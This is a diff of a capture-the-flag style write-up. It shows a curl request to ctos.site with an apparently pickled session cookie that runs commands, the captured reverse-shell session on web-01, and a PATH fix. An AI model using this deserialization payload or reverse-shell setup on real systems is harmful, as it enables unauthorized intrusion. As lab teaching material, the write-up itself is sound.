@@ -428,8 +428,45 @@ curl http://ctos.site/ -H 'Cookie: ctos_session=gAWV5wAAAAAAAACMBXBvc2l4lIwGc3lz
 Now ill send the request using the malicious session
 
 ```python
-
+penelope -p 1337
+[+] Listening for reverse shells on 0.0.0.0:1337 -> 127.0.0.1 • 192.168.86.130 • 10.200.88.158
+➤  🏠 Main Menu (m) 💀 Payloads (p) 🔄 Clear (Ctrl-L) 🚫 Quit (q/Ctrl-C)
+[+] [New Reverse Shell] => /bin/sh: 7: grep: not found
+web-01 10.1.61.204 Linux-x86_64 👤 /bin/sh: 3: id: not found
+/bin/sh: 3: id: not found
+() 😍️ Session ID <1>
+[+] ⭐ Agent deployed via /usr/bin/python3
+[-] Cannot get the TTY of the shell. Response:
+Command 'tty' is available in the following places
+ * /bin/tty
+ * /usr/bin/tty
+The command could not be located because '/usr/bin:/bin' is not included in the PATH environment variable.
+tty: command not found
+[+] Interacting with session [1] • PTY • Menu key F12 ⇐
+[+] Session log: /home/kali/.penelope/sessions/_bin_sh: 7: grep: not found
+web-01~10.1.61.204-Linux-x86_64/2026_09_01-12_54_18-812-_bin_sh: 3: id: not found
+_bin_sh: 3: id: not found
+().log
+──────────────────────────────────────────────────────────────────────────────────────────────────────────────
+bash: groups: command not found
+phil@web-01:/opt/ctos_portal$
 ```
+
+However i cant really run commands, since the path `/usr/bin` is not in the path, so ill export that
+
+```python
+export PATH=/usr/bin
+```
+
+```python
+phil@web-01:/opt/ctos_portal$ whoami
+phil
+phil@web-01:/opt/ctos_portal$
+```
+
+Now i can run commands
+
+
 
 
 
